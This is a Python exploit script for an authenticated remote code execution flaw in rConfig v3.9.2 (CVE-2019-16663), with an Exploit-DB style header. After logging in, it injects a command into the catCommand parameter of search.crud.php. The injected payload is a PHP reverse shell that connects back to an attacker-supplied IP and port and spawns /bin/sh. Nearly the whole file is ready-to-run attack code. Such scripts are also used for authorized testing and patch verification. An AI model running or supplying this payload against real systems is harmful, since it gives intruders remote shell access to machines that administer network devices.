#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16663
# Vendor Homepage: https://rconfig.com/
# Software link: https://rconfig.com/download
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22


import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 6:
    print "[+] Usage : ./exploit.py target username password ip port"
    exit()

target = sys.argv[1]

username = sys.argv[2]

password = sys.argv[3]

ip = sys.argv[4]

port = sys.argv[5]

request = requests.session()

login_info = {
    "user": username,
    "pass": password,
    "sublogin": 1
}

login_request = request.post(
    target+"/lib/crud/userprocess.php",
     login_info,
     verify=False,
     allow_redirects=True
 )

dashboard_request = request.get(target+"/dashboard.php", allow_redirects=False)


if dashboard_request.status_code == 200:
    print "[+] LoggedIn successfully"
    payload = '''""&amp;&amp;php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'#'''.format(ip, port)
    encoded_request = target+"/lib/crud/search.crud.php?searchTerm=anything&amp;catCommand={0}".format(quote(payload))
    print "[+] triggering the payload"
    print "[+] Check your listener !"
    exploit_req = request.get(encoded_request)

elif dashboard_request.status_code == 302:
    print "[-] Wrong credentials !"
    exit()
